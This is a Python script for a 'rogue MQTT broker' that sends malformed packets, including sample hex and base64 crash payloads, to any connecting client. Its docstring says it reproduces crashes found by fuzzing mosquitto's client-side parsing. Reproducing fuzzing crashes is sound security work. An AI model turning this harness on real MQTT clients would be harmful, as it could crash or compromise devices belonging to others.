#!/usr/bin/env python3
"""
Rogue MQTT Broker - Sends malformed packets to connecting clients.

Used to reproduce crashes found by fuzzing mosquitto's client-side parsing.
Accepts crash files (raw bytes) or hex strings as input.

Usage:
    # Send a crash file to any connecting client
    ./rogue_broker.py --file crash.raw

    # Send hex-encoded payload
    ./rogue_broker.py --hex "200a00e80312000003000b0b0b090b0b0aa72dffffefffffda2c"

    # Send base64-encoded payload
    ./rogue_broker.py --base64 "IAoA6AMSAAADAAsLCwkLCwqnLf//7///2iw="

    # Custom port
    ./rogue_broker.py --file crash.raw --port 1884

    # Wait for CONNECT before sending (more realistic)
    ./rogue_broker.py --file crash.raw --wait-connect

    # Loop mode - keep accepting connections
    ./rogue_broker.py --file crash.raw --loop
"""

import argparse
import base64
import socket
import sys
from pathlib import Path


def load_payload(args) -> bytes:
    """Load payload from file, hex string, or base64."""
    if args.file:
        path = Path(args.file)
        if not path.exists():
            print(f"Error: File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        return path.read_bytes()
    elif args.hex:
        try:
            return bytes.fromhex(args.hex)
        except ValueError as e:
            print(f"Error: Invalid hex string: {e}", file=sys.stderr)
            sys.exit(1)
    elif args.base64:
        try:
            return base64.b64decode(args.base64)
        except Exception as e:
            print(f"Error: Invalid base64 string: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("Error: Must specify --file, --hex, or --base64", file=sys.stderr)
        sys.exit(1)


def read_mqtt_packet(sock: socket.socket, timeout: float = 2.0) -> bytes | None:
    """Read a single MQTT packet from socket."""
    sock.settimeout(timeout)
    try:
        # Read fixed header (at least 2 bytes)
        header = sock.recv(2)
        if len(header) < 2:
            return None

        # Parse remaining length (variable length encoding)
        remaining_len = 0
        multiplier = 1
        pos = 1

        while True:
            if header[pos] & 0x80:
                remaining_len += (header[pos] & 0x7F) * multiplier
                multiplier *= 128
                # Read next byte
                next_byte = sock.recv(1)
                if not next_byte:
                    return None
                header += next_byte
                pos += 1
                if pos > 4:
                    return None  # Invalid: too many length bytes
            else:
                remaining_len += header[pos] * multiplier
                break

        # Read payload
        payload = b""
        while len(payload) < remaining_len:
            chunk = sock.recv(remaining_len - len(payload))
            if not chunk:
                return None
            payload += chunk

        return header + payload

    except socket.timeout:
        return None
    except Exception as e:
        print(f"Error reading packet: {e}", file=sys.stderr)
        return None


def get_packet_type_name(packet_type: int) -> str:
    """Get MQTT packet type name."""
    types = {
        0x10: "CONNECT",
        0x20: "CONNACK",
        0x30: "PUBLISH",
        0x40: "PUBACK",
        0x50: "PUBREC",
        0x60: "PUBREL",
        0x70: "PUBCOMP",
        0x80: "SUBSCRIBE",
        0x90: "SUBACK",
        0xA0: "UNSUBSCRIBE",
        0xB0: "UNSUBACK",
        0xC0: "PINGREQ",
        0xD0: "PINGRESP",
        0xE0: "DISCONNECT",
        0xF0: "AUTH",
    }
    return types.get(packet_type & 0xF0, f"UNKNOWN(0x{packet_type:02x})")


def run_broker(args, payload: bytes):
    """Run the rogue broker."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((args.bind, args.port))
        server.listen(1)
        print(f"[*] Rogue broker listening on {args.bind}:{args.port}")
        print(f"[*] Payload: {len(payload)} bytes")
        print(f"[*] Payload hex: {payload[:32].hex()}{'...' if len(payload) > 32 else ''}")
        print(f"[*] Payload type: {get_packet_type_name(payload[0])}")
        print()

        while True:
            print("[*] Waiting for client connection...")
            client, addr = server.accept()
            print(f"[+] Client connected from {addr[0]}:{addr[1]}")

            try:
                if args.wait_connect:
                    print("[*] Waiting for CONNECT packet...")
                    packet = read_mqtt_packet(client)
                    if packet:
                        ptype = get_packet_type_name(packet[0])
                        print(f"[<] Received {ptype} ({len(packet)} bytes)")
                        if args.verbose:
                            print(f"    Hex: {packet.hex()}")
                    else:
                        print("[!] No packet received, sending payload anyway")

                print(f"[>] Sending malformed payload ({len(payload)} bytes)...")
                client.sendall(payload)
                print("[+] Payload sent!")

                # Optionally wait a bit to see if client sends anything back
                if args.verbose:
                    response = read_mqtt_packet(client, timeout=1.0)
                    if response:
                        print(f"[<] Client response: {response.hex()}")

            except BrokenPipeError:
                print("[!] Client disconnected (broken pipe)")
            except ConnectionResetError:
                print("[!] Client disconnected (connection reset)")
            except Exception as e:
                print(f"[!] Error: {e}")
            finally:
                client.close()
                print("[*] Connection closed")
                print()

            if not args.loop:
                break

    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server.close()


def main():
    parser = argparse.ArgumentParser(
        description="Rogue MQTT broker for reproducing client-side crashes",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # Payload source (mutually exclusive)
    payload_group = parser.add_mutually_exclusive_group(required=True)
    payload_group.add_argument(
        "-f", "--file",
        help="Path to crash file (raw bytes)"
    )
    payload_group.add_argument(
        "-x", "--hex",
        help="Hex-encoded payload"
    )
    payload_group.add_argument(
        "-b", "--base64",
        help="Base64-encoded payload"
    )

    # Network options
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=1883,
        help="Port to listen on (default: 1883)",
    )
    parser.add_argument(
        "--bind",
        default="0.0.0.0",
        help="Address to bind to (default: 0.0.0.0)",
    )

    # Behavior options
    parser.add_argument(
        "-w", "--wait-connect",
        action="store_true",
        help="Wait for CONNECT packet before sending payload",
    )
    parser.add_argument(
        "-l", "--loop",
        action="store_true",
        help="Keep accepting connections (don't exit after first client)",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output (show packet contents)",
    )

    args = parser.parse_args()
    payload = load_payload(args)

    if len(payload) < 2:
        print("Error: Payload too short (need at least 2 bytes)", file=sys.stderr)
        sys.exit(1)

    run_broker(args, payload)


if __name__ == "__main__":
    main()
